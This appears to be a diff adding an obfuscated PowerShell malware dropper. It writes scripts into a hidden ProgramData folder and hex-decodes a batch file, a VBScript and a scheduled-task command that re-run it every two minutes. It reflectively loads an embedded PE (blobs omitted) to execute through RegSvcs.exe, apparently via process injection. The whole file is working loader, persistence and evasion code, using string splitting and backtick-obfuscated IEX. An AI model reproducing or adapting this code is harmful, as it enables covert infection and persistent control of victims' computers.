@@ -1,0 +1,52 @@
+﻿$a = "C:\ProgramData\e594e8d1fb".Replace("/","")
+New-Item $a -ItemType Directory -Force
+Sleep 1
+$Content = @'
+Try{
+function xxx {
+param($app1)$app1 = $app1 -split '(..)' | ? { $_ }
+ForEach ($UX2 in $app1)
+{
+[Convert]::ToInt32($UX2,16)
+}
+}
+[Byte[]] $xxx = xxx $code
+[byte[]] $apprun  = xxx('4D5A9____3____...______'.Replace('_','0')) # The omitted '4D5A9____3____...______' is actually a 89089 character long string.
+}catch{}
+Try{
+[byte[]] $appme  = xxx '4D5A9...000' # The omitted '4D5A9...000' is actually a 135169 character long string.
+$T = 'Get'
+$M = $T + 'Method'
+$I = 'Invoke'
+$T = $T + 'Type'
+$L = 'Load'
+$Q0 = [<#1#>Reflection.Assembly<#1#>]
+$B = $Q0::$L($apprun)
+$B = $B.$T('NewPE2.PE')
+$B = $B.$M('Execute')
+$Mn = 'C:\Windows\Mic'
+$Ub = $Mn + 'rosoft.NET\Fr'
+$z = $Ub + 'amework\v4.0'
+$VT = $z + '.30319\'
+$XQ = $VT + 'RegSvcs.exe'
+}catch{}
+return $B = $B.$I($null,[object[]] ($XQ,$appme));
+'@
+[IO.File]::WriteAllText("C:\ProgramData\e594e8d1fb\py.ps1", $Content)
+function pyx {
+param($e594e8d1fb)$e594e8d1fb = $e594e8d1fb -split '(..)' | ? { $_ }
+ForEach ($chrome in $e594e8d1fb){[Convert]::ToInt32($chrome,16)}}
+[byte[]] $bytes2  = pyx('EFBBBF747279200D0A7B0D0A26277363687461736B732E6578652720272F6372656174652720272F73632720276D696E7574652720272F6D6F27203220272F746E27202753637265656E2720272F74722720282827433A5C50726F6772616D446174615C653539346538643166625C53637265656E73686F742E7662732729293B0D0A0D0A7D206361746368207B207D0D0A0D0A536C65657020310D0A4960456058285B494F2E46696C655D3A3A52656164416C6C546578742827433A5C50726F6772616D446174615C653539346538643166625C70792E707331272929')
+[io.file]::WriteAllBytes("C:\ProgramData\e594e8d1fb\x.ps1",$bytes2)
+function pyx {
+param($e594e8d1fb)$e594e8d1fb = $e594e8d1fb -split '(..)' | ? { $_ }
+ForEach ($chrome in $e594e8d1fb){[Convert]::ToInt32($chrome,16)}}
+[byte[]] $bytes2  = pyx('6F6E206572726F7220726573756D65206E6578740D0A736574206F5368656C6C203D206372656174654F626A656374284368725728383729202B204368725728383329202B204368725728393929202B20436872572831313429202B20436872572831303529202B20436872572831313229202B20436872572831313629202B204368725728343629202B204368725728383329202B20436872572831303429202B20436872572831303129202B20436872572831303829202B20436872572831303829290D0A6F5368656C6C2E72756E2022433A5C50726F6772616D446174615C653539346538643166625C312E626174222C20300D0A6F6E206572726F7220676F746F2030')
+[io.file]::WriteAllBytes("C:\ProgramData\e594e8d1fb\Screenshot.vbs",$bytes2)
+function pyx {
+param($e594e8d1fb)$e594e8d1fb = $e594e8d1fb -split '(..)' | ? { $_ }
+ForEach ($chrome in $e594e8d1fb){[Convert]::ToInt32($chrome,16)}}
+[byte[]] $bytes2  = pyx('5345542021413D450D0A434D44202F4320504F5725214125525348454C4C202D4E4F50202D57494E442048494444454E202D6558454320425950415353202D4E4F4E492022433A5C50726F6772616D446174615C653539346538643166625C70792E70733122')
+[io.file]::WriteAllBytes("C:\ProgramData\e594e8d1fb\1.bat",$bytes2)
+Start-Sleep 7
+I`E`X([IO.File]::ReadAllText('C:\ProgramData\e594e8d1fb\x.ps1'))
